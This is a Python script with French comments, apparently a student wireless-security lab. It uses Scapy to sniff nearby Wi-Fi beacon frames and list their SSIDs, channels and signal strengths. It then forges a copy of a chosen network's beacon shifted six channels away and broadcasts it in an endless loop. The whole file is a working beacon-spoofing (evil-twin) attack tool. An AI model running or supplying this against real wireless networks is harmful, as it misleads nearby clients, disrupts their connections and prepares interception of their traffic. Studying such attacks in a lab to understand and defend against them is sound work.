# source :  https://pypi.org/project/texttable/
#           https://www.shellvoide.com/python/how-to-code-a-simple-wireless-sniffer-in-python/
#           http://www.securityflux.com/?p=168
#           https://github.com/secdev/scapy/blob/master/scapy/modules/krack/automaton.py
#
# Auteurs : Benoit Julien et Sutcu Volkan
# But: récupérer les SSID afin de proposer à l'utilisateurs d'en choisir un, afin de forger un beacon concurant à ce dernier avec une channel différente de 6 canaux
# Date : 09.03.2020

from scapy.all import *
import argparse
import texttable as tt
ap_list = [] #liste pour l'affichage
pkt_list = [] #liste des paquets récupérer
bssid_tab = [] #liste des bssid afin de ne pas avoir de doublon

# fonction permettant de chercher les information d'un paquet nécessaire à l'affichage
def findSSID(pkt):
    # vérifie que nous somme bien dans une trame beacon
    if pkt.haslayer(Dot11Beacon):
        if(pkt.type == 0 and pkt.subtype == 8):
            if pkt.getlayer(Dot11).addr2 not in bssid_tab:
                ssid = pkt.getlayer(Dot11Elt).info.decode("utf-8")
                # si le ssid est caché, on lui attribue un nom
                if ssid == '' or pkt.getlayer(Dot11Elt).ID != 0:
                    ssid = "Réseau caché"

                try:
                    # récupère la channel
                    channel = pkt[Dot11Elt][2].info
                    channel = int.from_bytes(channel, byteorder='big')
                    # récupère la puissance
                    radiotap = pkt.getlayer(RadioTap)
                    rssi = radiotap.dBm_AntSignal
                except:
                    # si on a pas réussi à récupèrer la channel et la puissance, on met "inconnu"
                    channel = "inconnu"
                    rssi = "inconnu"

                # met à jour les listes avec les informations nécessaire
                ap_list.append([pkt.getlayer(Dot11).addr2, ssid, channel, rssi])
                bssid_tab.append(pkt.getlayer(Dot11).addr2)
                pkt_list.append(pkt)

# fonction permettant de forger un fake beacon avec une channel différente de 6 canaux
def fakeBeacon(pkt):
    if pkt.haslayer(Dot11Beacon):
        if(pkt.type == 0 and pkt.subtype == 8):
            # on forge la nouvelle channel avec 6 canaux de différence
            channel = ((int.from_bytes(pkt[Dot11Elt][2].info, byteorder='big')+ 5) % 13) + 1
            fakeBeacon = pkt            
            # on récupère la fin du paquet, étant donné qu'en changeant le channel les layers d'en dessous sont écrasée
            end_pkt = fakeBeacon[Dot11Elt][3]
            # # on change la channel avec 6 canaux de différence
            fakeBeacon[Dot11Elt:3] = Dot11Elt(ID="DSset", len=len(channel.to_bytes(1, 'big')), info=(channel.to_bytes(1, 'big')))
            # on reconstruit le paquet et l'envoie avec une boucle infinie
            beacon = fakeBeacon/end_pkt
            sendp(beacon, iface = interface, loop=1)

# fonction permettant d'afficher proprement les informations
def display(ap_list):
    table = tt.Texttable()
    table.set_deco(tt.Texttable.HEADER)
    table.set_cols_dtype(['i','t','t','t','t']) 
    table.set_cols_align(["l", "l", "l", "l", "l"])
    table.add_row(["N°", "BSSID", "SSID", "Channel", "Strength"])

    i = 0

    for element in ap_list :
        i=i+1
        table.add_row([i, element[0], element[1], element[2], element[3]])
    print (table.draw())


interface = input("Écrivez le nom de l'interface que vous voulez sniffer : ")
print("vous avez choisi l'interface : " + interface) 
sniff(iface=interface, prn=findSSID, timeout=10)
display(ap_list)

choosenSSID = input("choisissez le numéro de la ligne contenant le SSID que vous voulez changez (ex : 1,2,3,etc...): ")
print("vous avez choisi le numéro : " + choosenSSID)
fakeBeacon(pkt_list[int(choosenSSID)-1])			
